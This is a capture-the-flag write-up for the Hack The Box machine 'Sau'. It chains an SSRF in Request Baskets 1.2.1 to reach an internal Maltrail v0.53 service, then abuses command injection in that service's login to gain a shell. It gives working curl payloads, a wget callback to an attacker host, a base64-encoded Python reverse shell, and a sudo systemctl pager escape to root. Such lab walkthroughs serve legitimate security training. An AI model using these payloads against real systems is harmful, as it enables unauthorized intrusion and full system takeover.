---
title: Sau Writeup
---


Starting off with an `nmap` scan for the box: `nmap -sV -sC 10.10.11.224`:

![](https://i.imgur.com/eyG3xCr.png)

We see that there's 3 ports opened:
* `22` - SSH
* `80` - HTTP
* `55555` - Unknown

SSH is usually not a port to focus on when it comes to HTB machines, and port 80 is being filtered so we likely will not be able to access it. So let's focus our efforts on this unknown service running on port `55555`.

Visiting port `55555`, we see a service called `Requests Baskets`:

![](https://i.imgur.com/4tMYH4U.png)

If we view the source code of the page, we see that the version of `Requests Baskets` that it's running is `1.2.1`. If we lookup `Requests Baskets version 1.2.1 Exploit`, we'll come across [this Medium article](https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7) that talks about exploiting a SSRF vulnerability! 

To summarize the article, we can take advantage of the baskets the web app creates to forward requests to internal network resources. So we could gain access to port `80` on the target by exploiting this SSRF! You can find more information about the Bash script that exploits this vulnerability [here](https://github.com/entr0pie/CVE-2023-27163), but the core part of it is this command:

`curl -s -X POST -H 'Content-Type: application/json' -d '{"forward_url": "http://127.0.0.1:80/","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}' "http://<Target IP Address>:55555/api/baskets/<random value>"`

All this command is doing is making a `POST` request to create a basket with a random value as the basket name, then using a custom payload that will essentially allow our request to the newly created basket to be routed to the internal network on port `80`. The custom payload is:

```
{"forward_url": "http://127.0.0.1:80/","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}
```

We could recreate this request in Burpsuite and it would look like this: 

![](https://i.imgur.com/i2CJ7Ry.png)

Then we could simply go to the URL of the API basket:

![](https://i.imgur.com/F0oAP3R.png)

Then visit the given URL: `http://10.10.11.224:55555/j5wj8A0`:

![](https://i.imgur.com/cB2wW8e.png)

And we're able to access the service running on port 80! It's a `MailTrail v0.53` server!

Searching for vulnerabilities within this version of Mailtrail, we'll find that the username parameter within the login page allows us to execute commands. There's various exploits, such as [this one](https://github.com/spookier/Maltrail-v0.53-Exploit) which runs `curl` in order to exploit it by adding a semicolon at the end of the `username` parameter. 

The actual vulnerability is listed on [huntr.dev here](https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/) and as you can see, there's even an example payload:

```bash
curl 'http://hostname:8338/login' \
  --data 'username=;`id > /tmp/bbq`'
```

Let's take this and attempt to run the `whoami` command with this payload:

![](https://i.imgur.com/glhSVTg.png)

We don't get any output from the command, so it seems like we have blind OS command injection. We can confirm this by setting up a simple Python web server, then using a payload that makes a `GET` request to our Python server!

First, let's run the python server: `python3 -m http.server`, then our payload would be:

```bash
curl 'http://10.10.11.224:55555/j5wj8A0/login' \
  --data 'username=;`wget http://<Attacker IP Address>:8000`'
```

![](https://i.imgur.com/OIj8xGD.png)

As you can see, it is indeed blind OS command injection! Let's use a reverse shell payload using Python3:

```python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Attacker IP Address>",<Attacker Listening Port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Then base64 encode it, then let's add it to our curl requests as follows:

```bash
curl 'http://10.10.11.224:55555/j5wj8A0/login' --data 'username=;`echo+"cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0Ljk2Iiw2MDAxKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn="+|+base64+-d+|+sh`'
```

*note: notice how we removed all spaces & replaced them with addition symbols instead, we did this since we're making a GET request*

![](https://i.imgur.com/7pkRdmk.png)

And as you can see, we got a shell! Let's upgrade our shell by running `python3 -c import 'pty;pty.spawn("/bin/bash");'`

Let's move onto the privilege escalation component!

Listing what commands we can run as `sudo`:

![](https://i.imgur.com/plMzlyE.png)

We see we can run `systemctl` as sudo without a password, & check the status of the mailtrail service. If we search online for a privilege escalation with `systemctl status`, we'll come across [this guide](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/) for some `systemctl` privesc guidance.

Scrolling to the [Spawn Shell in the Pager Section](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/#spawn-shell-in-the-pager), it shows that we can execute `systemctl status <service name>` as root, then spawn a shell using `!sh` within the default pager that `systemctl` provides!

So technically, we should be able to first run `sudo systemctl status trail.service` which would give us a default pager:

![](https://i.imgur.com/4Lrtuzp.png)

Then we can type `!sh` within the pager:

![](https://i.imgur.com/o1FeoDo.png)

And we got `root`!

# References
* https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/
* https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7

